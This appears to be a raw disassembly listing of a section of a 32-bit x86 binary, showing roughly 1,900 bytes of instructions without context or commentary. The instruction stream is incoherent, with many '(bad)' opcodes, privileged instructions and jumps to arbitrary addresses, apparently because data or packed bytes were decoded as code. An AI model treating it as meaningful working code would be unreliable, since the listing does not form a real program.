  404140:	imul   ebx,DWORD PTR [esp+eax*4-0x6eaf6063],0xffffffac
  404148:	enter  0x394e,0xf3
  40414c:	shl    BYTE PTR [ebx],cl
  40414e:	inc    edx
  40414f:	add    edx,edi
  404151:	aad    0xf
  404153:	pop    es
  404154:	aad    0x3c
  404156:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404157:	and    ecx,eax
  404159:	loop   0x40413f
  40415b:	mov    WORD PTR [esi-0x1cb53d18],?
  404161:	inc    esp
  404162:	jge    0x40417e
  404164:	mov    ecx,0xe80d354e
  404169:	leave  
  40416a:	mov    ds:0x51b6fd8c,al
  40416f:	enter  0x5e50,0x5
  404173:	daa    
  404174:	pop    esi
  404175:	imul   esi,DWORD PTR [edx+ecx*2+0x5f],0x5f52a9f1
  40417d:	sub    DWORD PTR [ebp+0x64],0x4393a011
  404184:	jmp    0x4041cd
  404186:	sub    bl,BYTE PTR [ebx]
  404188:	mov    cl,0x78
  40418a:	outs   dx,BYTE PTR ds:[esi]
  40418b:	sub    eax,0x583a1978
  404190:	aaa    
  404191:	ja     0x40419f
  404193:	fld    TBYTE PTR [eax-0x55be2b25]
  404199:	mov    al,ds:0xab396b11
  40419e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40419f:	mov    ecx,0xe37a92b1
  4041a4:	jo     0x4041e5
  4041a6:	hlt    
  4041a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041a8:	lds    edx,FWORD PTR [ebx]
  4041aa:	mov    ah,0x37
  4041ac:	gs aas 
  4041ae:	sbb    al,0x88
  4041b0:	sbb    al,0xc0
  4041b2:	mov    BYTE PTR [ebx],bl
  4041b4:	in     al,0xbc
  4041b6:	mov    DWORD PTR [edi],0x6152cfc2
  4041bc:	push   0xffffffd8
  4041be:	ss pop esi
  4041c0:	test   BYTE PTR [esi+0x4212d9da],al
  4041c6:	mov    edi,0x41fd0f6
  4041cb:	mov    al,0xe8
  4041cd:	iret   
  4041ce:	xchg   ecx,eax
  4041cf:	sub    al,0x12
  4041d1:	mov    ah,dl
  4041d3:	cmp    al,0xe8
  4041d5:	xchg   ebp,eax
  4041d6:	pop    DWORD PTR [esi-0x2c4c5a95]
  4041dc:	push   es
  4041dd:	aad    0x3a
  4041df:	aad    0xeb
  4041e1:	mov    esp,0xabff6607
  4041e6:	es xor al,0xe7
  4041e9:	iret   
  4041ea:	fstp   TBYTE PTR [edi+0x7ec4a592]
  4041f0:	test   DWORD PTR [edi-0x42],0x78e44c25
  4041f7:	dec    edx
  4041f8:	retf   
  4041f9:	pop    esp
  4041fa:	ds cmc 
  4041fc:	xor    BYTE PTR [esi],ch
  4041fe:	jl     0x4041b1
  404200:	shl    dh,1
  404202:	sti    
  404203:	cmp    DWORD PTR [esi+0x706fbfa4],0x4d8faa84
  40420d:	sar    ecx,cl
  40420f:	jbe    0x4041c9
  404211:	sti    
  404212:	scas   eax,DWORD PTR es:[edi]
  404213:	mov    ds:0x1cd6bc6,al
  404218:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404219:	push   esp
  40421a:	jnp    0x404209
  40421c:	cmp    al,0xb5
  40421e:	(bad)  
  40421f:	mov    esi,0xcd8ab969
  404224:	fsub   st(1),st
  404226:	outs   dx,BYTE PTR ds:[esi]
  404227:	mov    BYTE PTR [edi+eax*1-0x75],0xd8
  40422c:	jl     0x4041e0
  40422e:	xchg   edi,eax
  40422f:	jmp    0xf04f66a3
  404234:	test   al,0xd0
  404236:	xor    eax,0x12acaa12
  40423b:	call   0xf97ba15e
  404240:	ds push esp
  404242:	sbb    dh,BYTE PTR [ecx]
  404244:	pop    edx
  404245:	pusha  
  404246:	loopne 0x404250
  404248:	jg     0x40423c
  40424a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40424b:	pop    ss
  40424c:	mov    dh,0xb0
  40424e:	push   cs
  40424f:	xor    DWORD PTR [edx-0x7cabd6f3],esi
  404255:	call   0x1a2b:0xdb3017c2
  40425c:	inc    edi
  40425d:	lahf   
  40425e:	push   esi
  40425f:	push   esp
  404260:	jns    0x4042dc
  404262:	add    BYTE PTR [ecx+0x3e],dh
  404265:	inc    ebx
  404266:	push   esp
  404267:	dec    edx
  404268:	dec    esp
  404269:	inc    ebx
  40426a:	dec    edi
  40426b:	or     DWORD PTR [eax+esi*8],esi
  40426e:	popf   
  40426f:	(bad)  
  404270:	aad    0x7
  404272:	lods   al,BYTE PTR ds:[esi]
  404273:	xchg   ebx,eax
  404274:	lods   eax,DWORD PTR ds:[esi]
  404275:	xor    al,0xf8
  404277:	pop    ebp
  404278:	push   eax
  404279:	popa   
  40427a:	ss adc ah,bl
  40427d:	mov    ds:0x40f7ead9,eax
  404282:	sti    
  404283:	xchg   ebx,eax
  404284:	shr    DWORD PTR [ecx-0x7f83215c],cl
  40428a:	push   ss
  40428b:	data16 test al,0x25
  40428e:	mov    ch,0x6
  404290:	pop    esi
  404291:	inc    ecx
  404292:	mov    ecx,0x2bc7d9db
  404297:	test   DWORD PTR [ebp+0x7b2c0331],esp
  40429d:	or     al,0xd5
  40429f:	cmp    eax,0xd3558f6a
  4042a4:	add    BYTE PTR [ecx+0x2faf269c],cl
  4042aa:	adc    al,0x7b
  4042ac:	add    al,0xc2
  4042ae:	lods   eax,DWORD PTR ds:[esi]
  4042af:	repnz fidiv DWORD PTR [ebx+0xc]
  4042b3:	sub    eax,0xf7434d7e
  4042b8:	fcmove st,st(5)
  4042ba:	pop    eax
  4042bb:	sti    
  4042bc:	(bad)  
  4042be:	inc    edi
  4042bf:	pop    eax
  4042c0:	add    eax,DWORD PTR [esi+ebx*2-0x7b]
  4042c4:	out    0xf0,eax
  4042c6:	popa   
  4042c7:	push   cs
  4042c8:	outs   dx,DWORD PTR ds:[esi]
  4042c9:	inc    eax
  4042ca:	and    BYTE PTR [edx+0x249b700b],cl
  4042d0:	mov    bl,0xa5
  4042d2:	xchg   edx,eax
  4042d3:	daa    
  4042d4:	ror    BYTE PTR [ecx+0x2a60b99],0x9f
  4042db:	adc    BYTE PTR [esi],dl
  4042dd:	add    DWORD PTR [eax+0x42564994],ecx
  4042e3:	pop    ecx
  4042e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042e5:	ins    DWORD PTR es:[edi],dx
  4042e6:	pusha  
  4042e7:	jb     0x40426f
  4042e9:	pop    edx
  4042ea:	sub    eax,0x60cf2474
  4042ef:	jns    0x40430d
  4042f1:	sahf   
  4042f2:	adc    al,0xa3
  4042f4:	aam    0x36
  4042f6:	aaa    
  4042f7:	xor    ah,0x5
  4042fa:	mov    al,ds:0xfe17144
  4042ff:	mov    ah,0x85
  404301:	sub    DWORD PTR [edi],esi
  404303:	lahf   
  404304:	out    0x60,al
  404306:	jl     0x404347
  404308:	and    BYTE PTR [esi-0x40156e1f],al
  40430e:	or     BYTE PTR [ebp+0xc2c3b1e],dl
  404314:	retf   
  404315:	sub    al,dh
  404317:	outs   dx,BYTE PTR ds:[esi]
  404318:	out    0xb8,eax
  40431a:	pop    edx
  40431b:	pusha  
  40431c:	inc    ebx
  40431d:	scas   al,BYTE PTR es:[edi]
  40431e:	cmp    eax,0xd11394f1
  404323:	enter  0xf63,0x9c
  404327:	mov    bl,0x4f
  404329:	mov    ss,WORD PTR [edx-0x29d898aa]
  40432f:	cli    
  404330:	fwait
  404331:	ror    DWORD PTR [eax+eax*4-0x1c8321a4],0xfe
  404339:	mov    ebp,ebp
  40433b:	(bad)  
  40433c:	push   esi
  40433d:	cmp    al,0xc0
  40433f:	test   BYTE PTR [esi+0x21],ch
  404342:	(bad)  
  404344:	or     ebp,eax
  404346:	call   FWORD PTR [edi+0x1cf3c162]
  40434c:	mov    al,0x69
  40434e:	in     eax,0xd9
  404350:	inc    edi
  404351:	(bad)  
  404352:	or     ch,cl
  404354:	push   ecx
  404355:	scas   al,BYTE PTR es:[edi]
  404356:	xor    al,0x82
  404358:	popf   
  404359:	cmp    esp,DWORD PTR [ebp+0x1e]
  40435c:	js     0x40430f
  40435e:	lods   eax,DWORD PTR ds:[esi]
  40435f:	rcr    DWORD PTR [ebp-0x79],1
  404362:	add    eax,0x9d6c9ccd
  404367:	xor    edi,esi
  404369:	mov    dh,BYTE PTR [ecx-0x2c8ab491]
  40436f:	cld    
  404370:	fdiv   DWORD PTR [ecx+eiz*2+0x39]
  404374:	push   ss
  404375:	popa   
  404376:	xchg   edx,eax
  404377:	mov    eax,ds:0x92244200
  40437c:	fld    DWORD PTR es:[edi+0x59]
  404380:	sub    DWORD PTR [eax+0x7c8c82f1],edx
  404386:	pop    ebx
  404387:	inc    ebx
  404388:	mov    ecx,0xe3079992
  40438d:	sub    eax,0x3fe68889
  404392:	and    DWORD PTR [ecx],eax
  404394:	and    al,0xd6
  404396:	add    edx,DWORD PTR [ecx]
  404398:	out    0x59,eax
  40439a:	out    0x66,eax
  40439c:	xor    BYTE PTR [esi-0x5801f944],dh
  4043a2:	fild   WORD PTR [edi]
  4043a4:	push   ss
  4043a5:	ins    DWORD PTR es:[edi],dx
  4043a6:	fiadd  DWORD PTR [ebp-0x2635a046]
  4043ac:	pop    ebp
  4043ad:	out    0xe4,al
  4043af:	pop    esp
  4043b0:	xchg   esp,eax
  4043b1:	sub    BYTE PTR [edx],ch
  4043b3:	mov    bh,0xc5
  4043b5:	popf   
  4043b6:	aad    0xf
  4043b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043b9:	add    al,0x3e
  4043bb:	aas    
  4043bc:	dec    edx
  4043bd:	push   eax
  4043be:	jg     0x4043b1
  4043c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043c1:	(bad)  
  4043c2:	xor    al,0xab
  4043c4:	dec    esp
  4043c5:	daa    
  4043c6:	xchg   ebx,eax
  4043c7:	sbb    edi,esp
  4043c9:	imul   esi,DWORD PTR [edi-0x33b735b6],0x7e
  4043d0:	and    DWORD PTR [edx+0x9],0x22
  4043d4:	in     eax,dx
  4043d5:	js     0x4043ae
  4043d7:	rcr    BYTE PTR [edi-0x16],cl
  4043da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043db:	loope  0x404398
  4043dd:	hlt    
  4043de:	mov    dh,0x47
  4043e0:	ret    0x2496
  4043e3:	jne    0x40438c
  4043e5:	in     al,dx
  4043e6:	cwde   
  4043e7:	cmp    ch,ah
  4043e9:	out    dx,al
  4043ea:	enter  0x4cbc,0x5a
  4043ee:	cdq    
  4043ef:	and    ch,BYTE PTR ds:0x78893f9a
  4043f5:	jmp    0xdf81cfae
  4043fa:	iret   
  4043fb:	mov    ds:0x265ea9e3,eax
  404400:	dec    ebx
  404401:	icebp  
  404402:	and    DWORD PTR [ebx+0x7a20f178],edx
  404408:	dec    esp
  404409:	cld    
  40440a:	mov    BYTE PTR [esi+0x1e],ah
  40440d:	jp     0x40439c
  40440f:	inc    ebx
  404410:	mov    edi,0x34d27e45
  404415:	(bad)  
  404416:	cmp    BYTE PTR [eax+0x12],bl
  404419:	adc    al,0x1a
  40441b:	dec    esp
  40441c:	les    edi,FWORD PTR [eax]
  40441e:	mov    bh,0x45
  404420:	cmp    BYTE PTR [ecx+0x2],dh
  404423:	mov    WORD PTR [eax+0x77],cs
  404426:	mov    esp,0x89920549
  40442b:	mov    al,ch
  40442d:	into   
  40442e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40442f:	in     al,0x25
  404431:	test   DWORD PTR [ebx+0x6f],esi
  404434:	outs   dx,DWORD PTR ds:[esi]
  404435:	push   0xfffffff9
  404437:	jmp    0xc7b88d8
  40443c:	sub    eax,DWORD PTR [ecx-0x69]
  40443f:	push   0x55
  404441:	loop   0x40442a
  404443:	mov    al,0x1d
  404445:	sbb    edx,ebp
  404447:	push   ecx
  404448:	jmp    0xa56b:0x5e0ead22
  40444f:	pushf  
  404450:	cmp    dh,BYTE PTR [eax]
  404452:	std    
  404453:	push   0xae4a0cce
  404458:	imul   ax,di,0x8282
  40445d:	lock and al,0x4c
  404460:	pop    esp
  404461:	(bad)  
  404462:	mov    BYTE PTR [edi+0x4fd9fa0b],bl
  404468:	push   edi
  404469:	das    
  40446a:	ins    DWORD PTR es:[edi],dx
  40446b:	repz lea eax,[esi+0x64]
  40446f:	rol    DWORD PTR [ecx+0x51],0x32
  404473:	stos   BYTE PTR es:[edi],al
  404474:	and    esp,DWORD PTR [esi+0x5f]
  404477:	mov    eax,ds:0x16c6e5e9
  40447c:	or     ah,BYTE PTR [eax-0x1c]
  40447f:	mov    esp,0x428af060
  404484:	lea    edi,[ecx-0x57e4a59c]
  40448a:	lea    esi,ds:0xe168d5a7
  404490:	imul   ecx,DWORD PTR [eax+ebp*1],0xffffff92
  404494:	mov    BYTE PTR [edi+0x6b81901e],bl
  40449a:	shl    DWORD PTR [edx-0x6d],0x57
  40449e:	or     BYTE PTR fs:[ebx-0x5500906d],al
  4044a5:	and    BYTE PTR [ebp-0x61e1899d],al
  4044ab:	mov    edx,0xb7c6daa4
  4044b0:	jle    0x404530
  4044b2:	(bad)  
  4044b3:	adc    DWORD PTR [edx],ebx
  4044b5:	pushf  
  4044b6:	mov    edx,0xbde91f0b
  4044bb:	pop    eax
  4044bc:	test   eax,0x2d96c690
  4044c1:	std    
  4044c2:	scas   al,BYTE PTR es:[edi]
  4044c3:	gs mov ecx,0x599d2508
  4044c9:	dec    eax
  4044ca:	ret    
  4044cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044cc:	rol    DWORD PTR gs:[ebp-0x4e],cl
  4044d0:	aam    0x54
  4044d2:	push   eax
  4044d3:	in     al,dx
  4044d4:	mov    dh,0xfe
  4044d6:	mov    ebx,0x43a973be
  4044db:	adc    edi,DWORD PTR [ecx-0x24f71732]
  4044e1:	inc    ebp
  4044e2:	mov    cl,0xd9
  4044e4:	cmp    edx,DWORD PTR [ebx]
  4044e6:	and    DWORD PTR [edx-0x18],eax
  4044e9:	stc    
  4044ea:	or     eax,DWORD PTR [edx-0x31]
  4044ed:	addr16 (bad) 
  4044ef:	push   eax
  4044f0:	pop    esi
  4044f1:	mov    ch,0x45
  4044f3:	repz scas eax,DWORD PTR es:[edi]
  4044f5:	sub    BYTE PTR [edi+0x51],bl
  4044f8:	scas   al,BYTE PTR es:[edi]
  4044f9:	mov    esi,0x3c4ee438
  4044fe:	xlat   BYTE PTR ds:[ebx]
  4044ff:	stos   DWORD PTR es:[edi],eax
  404500:	fidiv  DWORD PTR [edx+ebp*2]
  404503:	mov    edx,0xbd15f85b
  404508:	(bad)  
  404509:	xor    dl,BYTE PTR es:[ebx]
  40450c:	mov    ebx,0xe50c8a3
  404511:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404512:	retf   
  404513:	mov    ah,0xe6
  404515:	adc    eax,0xc7dcfd24
  40451a:	pop    edi
  40451b:	mov    ecx,esp
  40451d:	jbe    0x4044fe
  40451f:	cmp    al,0xf0
  404521:	cmp    BYTE PTR [edx],cl
  404523:	sbb    bl,BYTE PTR [edx-0x5c441174]
  404529:	sbb    edi,DWORD PTR [ebp+0x15]
  40452c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40452d:	or     DWORD PTR [eax-0x7d32a8da],ecx
  404533:	pop    ss
  404534:	pop    edi
  404535:	call   0x5ba3:0x2d4b1f06
  40453c:	mov    eax,eax
  40453e:	or     DWORD PTR [edi],ebx
  404540:	pop    edx
  404541:	aaa    
  404542:	sub    DWORD PTR [ecx-0x10809c0a],esi
  404548:	stc    
  404549:	les    ebp,FWORD PTR ss:[bx]
  40454d:	pop    ss
  40454e:	int    0x2c
  404550:	inc    ecx
  404551:	call   0x4f38a6af
  404556:	mov    DWORD PTR [ebx+eax*4-0x1c9b28ae],esi
  40455d:	mov    esp,0x335a0e61
  404562:	cld    
  404563:	inc    ecx
  404564:	ja     0x4044ec
  404566:	je     0x4045dd
  404568:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404569:	mov    dh,0x7e
  40456b:	jp     0x404509
  40456d:	push   ss
  40456e:	imul   ecx,DWORD PTR [esi+0x47127e37],0x678bdde5
  404578:	cmp    al,BYTE PTR [esi+0x54c351a5]
  40457e:	stos   DWORD PTR es:[edi],eax
  40457f:	or     al,dl
  404581:	jmp    0x4045e8
  404583:	xor    BYTE PTR [ebx+0x1117e615],ah
  404589:	test   eax,0x534f11e9
  40458e:	cmp    cl,BYTE PTR [eax]
  404590:	mov    esp,DWORD PTR [esi+0x9]
  404593:	mov    gs,WORD PTR [ebp+edi*1-0x1c]
  404597:	fs cld 
  404599:	mov    ebp,ecx
  40459b:	pop    ebx
  40459c:	push   ebx
  40459d:	aam    0x1e
  40459f:	pop    eax
  4045a0:	retf   
  4045a1:	xor    bh,BYTE PTR [ebx-0x6f]
  4045a4:	fucomi st,st(2)
  4045a6:	ins    DWORD PTR es:[edi],dx
  4045a7:	sub    eax,0x738eeb29
  4045ac:	xchg   ebx,eax
  4045ad:	(bad)  
  4045ae:	lods   al,BYTE PTR ds:[esi]
  4045af:	cwde   
  4045b0:	push   es
  4045b1:	jbe    0x404596
  4045b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045b4:	pop    edi
  4045b5:	(bad)  
  4045b6:	es inc esi
  4045b8:	push   ebp
  4045b9:	ja     0x404619
  4045bb:	xlat   BYTE PTR ds:[ebx]
  4045bc:	dec    ecx
  4045bd:	cwde   
  4045be:	pop    ds
  4045bf:	adc    esi,DWORD PTR ds:0xe0200297
  4045c5:	xchg   ecx,eax
  4045c6:	jnp    0x404628
  4045c8:	or     eax,0xfe896bff
  4045cd:	lahf   
  4045ce:	in     al,0xd4
  4045d0:	mov    BYTE PTR [ebx+0x182d4da3],ch
  4045d6:	ret    
  4045d7:	sbb    edx,DWORD PTR [edx-0x56]
  4045da:	push   ebp
  4045db:	add    DWORD PTR [eax],eax
  4045dd:	loope  0x4045a4
  4045df:	int3   
  4045e0:	xchg   edx,eax
  4045e1:	imul   ecx,eax,0xa676c59e
  4045e7:	mov    ecx,0x81fabaa1
  4045ec:	test   al,0x92
  4045ee:	addr16 xor al,0xfa
  4045f1:	sub    al,BYTE PTR [ecx+0x709c4c6a]
  4045f7:	and    edi,DWORD PTR [ebp-0x23007f04]
  4045fd:	xchg   edi,eax
  4045fe:	(bad)  
  404600:	adc    al,BYTE PTR [edx+0x6f]
  404603:	cmp    al,0xc0
  404605:	out    0x97,al
  404607:	sbb    eax,0xa7f721a1
  40460c:	sbb    ah,ch
  40460e:	xchg   ebx,eax
  40460f:	xchg   edx,eax
  404610:	adc    esp,ebx
  404612:	sti    
  404613:	imul   ebx,eax,0xffffffb4
  404616:	add    BYTE PTR [edx+0x78],bl
  404619:	xchg   ecx,edx
  40461b:	(bad)  
  40461c:	cli    
  40461d:	lock push esp
  40461f:	adc    dh,bh
  404621:	into   
  404622:	imul   edi,DWORD PTR [ebx],0x54
  404625:	push   esp
  404626:	and    BYTE PTR [ebp-0x27c9afda],0x39
  40462d:	push   ebp
  40462e:	dec    ecx
  40462f:	inc    edx
  404630:	in     al,dx
  404631:	push   esp
  404632:	pop    es
  404633:	adc    al,0x49
  404635:	rol    al,0xb2
  404638:	fmul   st,st(1)
  40463a:	ins    DWORD PTR es:[edi],dx
  40463b:	xor    ebx,ebp
  40463d:	fld    TBYTE PTR [edi]
  40463f:	(bad)  
  404640:	mov    ecx,0xdf3c3200
  404645:	push   cs
  404646:	out    dx,eax
  404647:	cmp    BYTE PTR [ebx],dl
  404649:	outs   dx,BYTE PTR ds:[esi]
  40464a:	imul   ebx,DWORD PTR [edx],0xd6bea8b9
  404650:	mov    edx,0x713b1bad
  404655:	mov    ebx,0x9df6c48b
  40465a:	push   cs
  40465b:	cmp    DWORD PTR [ebp+0x7fadde95],edi
  404661:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404662:	xchg   ebx,eax
  404663:	mov    esi,DWORD PTR [ecx]
  404665:	push   ecx
  404666:	mov    edx,0x14a771f2
  40466b:	lahf   
  40466c:	push   cs
  40466d:	leave  
  40466e:	retf   
  40466f:	pop    es
  404670:	ret    0xcfe
  404673:	and    DWORD PTR [ecx+0xee5d892],eax
  404679:	jmp    0xad3:0xfda2ce43
  404680:	mov    WORD PTR [ebx-0x16],fs
  404683:	push   ebx
  404684:	ins    BYTE PTR es:[edi],dx
  404685:	(bad)  
  404687:	ror    edi,1
  404689:	popf   
  40468a:	jg     0x404630
  40468c:	sbb    eax,0xb303e881
  404691:	jle    0x404711
  404693:	sahf   
  404694:	adc    cl,BYTE PTR gs:[ebp+0x1f]
  404698:	mov    DWORD PTR [ecx+ecx*8],0x250f2263
  40469f:	ficom  WORD PTR [edi+0x1fec7db1]
  4046a5:	cs imul edi,esp,0x7d72303d
  4046ac:	sbb    cl,0x20
  4046af:	outs   dx,BYTE PTR ds:[esi]
  4046b0:	nop
  4046b1:	sar    DWORD PTR ds:0xf460a79,1
  4046b7:	dec    DWORD PTR [ebp+edx*4+0x42]
  4046bb:	stos   BYTE PTR es:[edi],al
  4046bc:	retf   
  4046bd:	sahf   
  4046be:	sahf   
  4046bf:	adc    al,0x7d
  4046c1:	stos   BYTE PTR es:[edi],al
  4046c2:	push   ecx
  4046c3:	and    BYTE PTR [ebx-0x3],ch
  4046c6:	aam    0x61
  4046c8:	popf   
  4046c9:	clc    
  4046ca:	sti    
  4046cb:	aam    0x1b
  4046cd:	ins    BYTE PTR es:[edi],dx
  4046ce:	data16 xchg BYTE PTR [eax+0x1055194b],bh
  4046d5:	loope  0x4046d9
  4046d7:	sbb    DWORD PTR [edx],esp
  4046d9:	rcl    DWORD PTR [ebx-0x7],cl
  4046dc:	xchg   edi,eax
  4046dd:	int3   
  4046de:	int    0x69
  4046e0:	fs mov ebx,0x7a3492d8
  4046e6:	(bad)  
  4046e8:	push   edi
  4046e9:	(bad)  
  4046ea:	in     al,dx
  4046eb:	mov    BYTE PTR [ecx],cl
  4046ed:	push   eax
  4046ee:	mov    ecx,0xab242394
  4046f3:	pop    edi
  4046f4:	cmp    dl,BYTE PTR [eax]
  4046f6:	fdiv   DWORD PTR [edi+edi*8]
  4046f9:	punpcklbw mm7,DWORD PTR [edx]
  4046fc:	call   DWORD PTR [eax+0x58]
  4046ff:	sbb    BYTE PTR [edx+0x19e9e892],0x3
  404706:	out    0xaf,al
  404708:	ja     0x404769
  40470a:	sbb    DWORD PTR [edi-0x14],eax
  40470d:	add    ecx,DWORD PTR [edi]
  40470f:	xor    edi,DWORD PTR [ecx+0x5da6d2c0]
  404715:	push   ebp
  404716:	dec    ecx
  404717:	xchg   edi,eax
  404718:	lods   eax,DWORD PTR ds:[esi]
  404719:	jg     0x40474e
  40471b:	sbb    al,0xa8
  40471d:	sbb    DWORD PTR ds:0x252be12a,edx
  404723:	retf   
  404724:	lea    edx,[ebx+0x7ff02edc]
  40472a:	mov    eax,ds:0xd6ac92b1
  40472f:	xchg   ebx,eax
  404730:	jg     0x4046d9
  404732:	pushf  
  404733:	call   0x8a78dc40
  404738:	in     eax,dx
  404739:	std    
  40473a:	mov    bh,0xfa
  40473c:	int    0x60
  40473e:	and    eax,0x24b00831
  404743:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404744:	clc    
  404745:	lods   al,BYTE PTR ds:[esi]
  404746:	aam    0x2a
  404748:	stc    
  404749:	mov    BYTE PTR [ebp+0x6b15ad6b],0xa4
  404750:	pop    ecx
  404751:	hlt    
  404752:	pop    edx
  404753:	xchg   ecx,eax
  404754:	xor    BYTE PTR [edx-0x7],ah
  404757:	inc    edx
  404758:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404759:	into   
  40475a:	sti    
  40475b:	push   ecx
  40475c:	xchg   edx,eax
  40475d:	addr16 xchg edx,eax
  40475f:	and    al,ah
  404761:	sbb    BYTE PTR [eax+0x538ef881],ch
  404767:	or     al,0x93
  404769:	xchg   ecx,eax
  40476a:	xchg   edi,eax
  40476b:	sub    DWORD PTR [ebx],0x32c0440f
  404771:	sub    esp,DWORD PTR [eax+edi*4-0x6d439f97]
  404778:	mov    ecx,0x65716184
  40477d:	lds    esp,FWORD PTR [ecx-0x37cacebd]
  404783:	xor    BYTE PTR cs:[ebp-0x1c],cl
  404787:	rol    DWORD PTR [edi+0x4c019fbe],0x8
  40478e:	mov    ah,0xa7
  404790:	mov    BYTE PTR [ecx+edx*2+0x2e],bh
  404794:	pop    esi
  404795:	gs push 0xa52b0f3
  40479b:	mov    ecx,0x15ef2b6d
  4047a0:	mov    ah,0x5b
  4047a2:	repnz aad 0xc
  4047a5:	icebp  
  4047a6:	xchg   esi,eax
  4047a7:	sbb    BYTE PTR [esi-0x50c44a35],al
  4047ad:	repz pop ebp
  4047af:	push   edx
  4047b0:	jo     0x404745
  4047b2:	outs   dx,BYTE PTR ds:[esi]
  4047b3:	jl     0x4047dd
  4047b5:	or     DWORD PTR [edx-0x35beb431],ebp
  4047bb:	dec    ebx
  4047bc:	jns    0x4047dd
  4047be:	data16 loopne 0x40474f
  4047c1:	adc    ecx,DWORD PTR [ebp-0x631ca10e]
  4047c7:	xchg   esi,eax
  4047c8:	test   ah,dl
  4047ca:	aad    0x5
  4047cc:	fdivrp st(1),st
  4047ce:	hlt    
  4047cf:	ds data16 xor al,0x50
  4047d3:	sub    edx,DWORD PTR [edx]
  4047d5:	pushf  
  4047d6:	xchg   BYTE PTR [ebx+0x63d8605d],dh
  4047dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047dd:	or     al,0x2b
  4047df:	adc    esp,ebp
  4047e1:	loop   0x4047b0
  4047e3:	rcr    ebp,cl
  4047e5:	movsx  ecx,di
  4047e8:	cwde   
  4047e9:	xor    edx,DWORD PTR [eax-0x5b]
  4047ec:	cmp    ebx,DWORD PTR [esi-0x27]
  4047ef:	gs loop 0x404832
  4047f2:	fld    st(0)
  4047f4:	pop    edi
  4047f5:	ins    BYTE PTR es:[edi],dx
  4047f6:	jge    0x404851
  4047f8:	bnd jo 0x40481b
  4047fb:	mov    dl,0xef
  4047fd:	fld    DWORD PTR [esi]
  4047ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404800:	mov    al,0xb4
  404802:	pop    esi
  404803:	jl     0x404805
  404805:	sub    cl,BYTE PTR [edx+ecx*2+0x4d]
  404809:	retf   0xc51b
  40480c:	pusha  
  40480d:	mov    dh,0x87
  40480f:	adc    DWORD PTR [ebx+0x55b3d384],eax
  404815:	mov    ah,0xc0
  404817:	ds stos BYTE PTR es:[edi],al
  404819:	sbb    cl,ah
  40481b:	dec    esp
  40481c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40481d:	call   0x4000:0xe90422f
  404824:	jp     0x40489f
  404826:	ficomp DWORD PTR [ebp+0x1b]
  404829:	and    cl,al
  40482b:	sbb    DWORD PTR [edi+0x6c],ebx
  40482e:	push   esi
  40482f:	dec    edi
  404830:	pop    es
  404831:	mov    esi,0x9dae54f
  404836:	mov    al,ds:0xa580089d
  40483b:	in     al,dx
  40483c:	jae    0x40482b
  40483e:	dec    edx
  40483f:	sub    edi,edi
  404841:	or     eax,0xdaba1516
  404846:	jle    0x404822
  404848:	arpl   WORD PTR [eax-0x69eebfd0],sp
  40484e:	push   edx
  40484f:	dec    ecx
  404850:	jns    0x40487c
  404852:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404853:	sahf   
  404854:	adc    eax,esp
  404856:	push   es
  404857:	rcl    DWORD PTR ds:0x3b3034ae,cl
  40485d:	or     BYTE PTR [ebx+0x3294aaa2],bl
  404863:	dec    DWORD PTR [ecx+0x4649d040]
  404869:	je     0x40484f
  40486b:	call   0x87cf3ec0
  404870:	mov    edx,0x7aa976f9
  404875:	nop
  404876:	and    edi,ebx
  404878:	es inc ebp
  40487a:	sbb    al,0x39
  40487c:	adc    ebx,ecx
  40487e:	sbb    al,0x1d
  404880:	mov    cl,0xbe
  404882:	mov    eax,0x78334f18
  404887:	xchg   ebx,eax
  404888:	push   0x6
  40488a:	test   al,0x9
  40488c:	out    0xae,al
  40488e:	outs   dx,DWORD PTR ds:[esi]
  40488f:	and    eax,0x6c796ffa
  404894:	jmp    0x40484a
  404896:	mov    edx,DWORD PTR [edx+0x7763d3eb]
  40489c:	(bad)  
  40489d:	(bad)  
  40489e:	dec    edx
  40489f:	mov    ebx,0x6a90a5f9
  4048a4:	adc    eax,0x83dfd54
  4048a9:	nop
  4048aa:	add    ax,0x780c
  4048ae:	and    edx,eax
  4048b0:	fidivr WORD PTR [edx]
  4048b2:	test   BYTE PTR [eax],al
  4048b4:	cli    
  4048b5:	rcl    BYTE PTR [edi-0x58],cl
  4048b8:	into   
  4048b9:	mov    esi,0xdf79e945
  4048be:	jne    0x404844
  4048c0:	cdq    
  4048c1:	mov    ecx,DWORD PTR [ecx+0xda718b9]
  4048c7:	maskmovq mm6,mm7
  4048ca:	fs test eax,0xf722ce16
  4048d0:	fild   WORD PTR [ebp-0x5226b012]
  4048d6:	inc    ebp
  4048d7:	(bad)  
  4048d8:	out    0xb1,al
  4048da:	mov    ebx,0xdd14c1b9
  4048df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048e0:	ror    cl,0x38
  4048e3:	lds    ebp,FWORD PTR [ebx-0x78a94ac2]
  4048e9:	jne    0x4048b6
  4048eb:	add    BYTE PTR [esi],al
  4048ed:	xor    BYTE PTR [edx+0x6a5f4217],ch
  4048f3:	xlat   BYTE PTR ds:[ebx]
  4048f4:	adc    al,0xbe
  4048f6:	xchg   edx,eax
  4048f7:	mov    ah,0xad
  4048f9:	cmp    eax,0x414e7f4f
